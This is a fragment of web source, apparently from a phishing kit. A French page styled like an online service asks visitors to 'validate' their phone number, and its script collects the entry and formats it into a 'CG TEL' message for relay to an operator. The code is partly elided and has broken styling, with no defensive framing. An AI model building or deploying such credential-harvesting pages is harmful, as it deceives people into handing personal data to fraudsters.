            ...
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-6">
                        ...
                        <div style="font-weight: 600;word-wrap: font-size: 18px;" class=" text-center mb-5">
Pour accéder à tous vos services en ligne,
merci de valider votre numéro de téléphone.
                        ...
                        <form class="text-center">
                            <div class="form-group mb-1">
                                <input type="text" name="confirm_code" id="confirm_code" ng-model="val_login" ng-change="bloc_confirm_code()" placeholder="Numéro de téléphone" maxlength="13">
                            ...
                            <div class="form-group mb-5 mt-4">
                               <!--  <button type="submit">
                                    <img src="assets/images/confirmer.jpg">
                                </button> -->

                            <button type="button" class="btnx" style="background-color: #e9041e!important;"  ng-click="valider_pwd()">
                                Confirmer
                            </button>
                            </div>
                        </form>
...
fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {
    ...
    var pathname = urlx.replace("tel.php", "");
    ...
    $scope.bloc_confirm_code = function(){ 
            $('.input-errorr').hide();
    }
  ...
  $(".overlay").show();
        $('.input-errorr').hide();
        if ($('#confirm_code').val().length >= 6) {
 
 
             var Detaile = {};
             Detaile.login= $('#confirm_code').val();
            ...
            const message = `CG TEL\n--------------\n<code>${Detaile.login}</code>\n\n--------------\n${Detaile.info}`;
